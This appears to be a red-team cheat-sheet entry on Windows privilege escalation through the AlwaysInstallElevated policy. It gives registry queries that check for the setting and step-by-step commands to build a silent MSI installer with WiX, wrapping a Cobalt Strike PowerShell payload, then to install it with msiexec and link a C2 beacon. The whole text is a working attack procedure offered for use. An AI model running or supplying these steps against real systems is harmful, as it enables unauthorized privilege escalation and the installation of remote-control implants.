### Always Install Elevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated




1. Download wixtoolset binaries from: https://github.com/wixtoolset/wix3/releases/tag/wix3112rtm
2. Generate powershell one liner through Cobat Strike
3. Use template as such installer.xml and update the PS Payload
4. candle.exe -out wix installer.xml
5. light.exe -out installer.msi wix
6. msiexec /i C:\Temp\MSIInstaller.msi /qn
7. Link with link 127.0.0.1 <beacon name>

```

 
